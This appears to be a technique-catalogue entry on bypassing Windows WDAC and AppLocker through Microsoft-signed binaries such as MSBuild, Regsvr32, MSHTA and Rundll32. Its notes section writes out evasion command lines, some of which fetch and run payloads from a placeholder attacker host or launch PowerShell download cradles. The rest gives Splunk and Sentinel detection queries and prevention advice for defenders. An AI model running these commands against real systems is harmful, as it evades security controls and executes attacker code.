name: WDAC/AppLocker Bypass - Application Control Evasion
description: Windows Defender Application Control (WDAC) and AppLocker restrict which executables can run. Bypasses abuse trusted Microsoft-signed binaries (LOLBins) that can execute arbitrary code: MSBuild.exe (XML payloads), InstallUtil.exe (.NET assemblies), Regsvr32.exe (scriptlets), MSHTA.exe (HTA files), and more. These binaries are allowed by default in most policies.
notes:
=== MSBUILD.EXE (most reliable) ===
  # Create payload.xml with inline C# task:
  # (Contains shellcode runner or reverse shell)
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

=== INSTALLUTIL.EXE ===
  # Compile .NET assembly with [System.ComponentModel.RunInstaller(true)]
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

=== REGSVR32.EXE (scriptlet) ===
  regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll

=== MSHTA.EXE ===
  mshta http://<attacker>/payload.hta
  mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"":close")

=== RUNDLL32.EXE ===
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(...)")

=== CMSTP.EXE ===
  cmstp.exe /ni /s payload.inf

=== WDAC vs APPLOCKER ===
  AppLocker: User-mode only, easier to bypass
  WDAC: Kernel-enforced, harder but still bypassable via LOLBins
  Both trust Microsoft-signed binaries by default

=== LOLBAS PROJECT ===
  Full list of Living Off The Land Binaries:
  https://lolbas-project.github.io/

references.title: MITRE T1218 - System Binary Proxy Execution

recommended.note: PowerShell downgrade bypasses AMSI; LOLBins bypass AppLocker/WDAC.

defense.why_it_works: Microsoft-signed binaries (MSBuild, InstallUtil, etc.) are trusted by default in WDAC/AppLocker policies. These binaries have legitimate functionality that can be abused to execute arbitrary code.
defense.prerequisites: Access to execute LOLBins on the target (usually available by default).
defense.impact: Execution of arbitrary code despite application control policies; defense evasion.
defense.detection: [MITRE T1218] Process creation of LOLBins with unusual arguments; MSBuild/InstallUtil loading suspicious XML/DLL files.
defense.artifacts: Sysmon Event 1 for MSBuild/InstallUtil with unusual command lines; .NET assembly loading events; network connections from LOLBins.
defense.splunk_spl:
index=sysmon EventCode=1 (Image="*MSBuild.exe" OR Image="*InstallUtil.exe" OR Image="*regsvr32.exe" OR Image="*mshta.exe" OR Image="*cmstp.exe")
| where NOT match(ParentImage, "(?i)devenv|visual studio")
| table _time, User, Image, CommandLine, ParentImage
defense.sentinel_kql:
DeviceProcessEvents
| where FileName in~ ("MSBuild.exe", "InstallUtil.exe", "regsvr32.exe", "mshta.exe", "cmstp.exe")
| where InitiatingProcessFileName !in~ ("devenv.exe", "explorer.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
defense.prevention: Block LOLBins via WDAC managed installer rules; use strict allowlisting; monitor LOLBin execution with Sysmon; implement ASR rules for Office/script blocking.

detections.name: LOLBin execution for application control bypass
detections.logic:
DeviceProcessEvents
| where FileName in~ ("MSBuild.exe", "InstallUtil.exe", "regsvr32.exe", "mshta.exe", "cmstp.exe", "rundll32.exe")
| where ProcessCommandLine has_any (".xml", ".sct", "/U", "/i:http", "javascript:", "vbscript:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
detections.false_positives: Legitimate MSBuild for .NET compilation; InstallUtil for service installation
detections.tuning: Whitelist developer workstations for MSBuild; alert on any LOLBin with network or script arguments
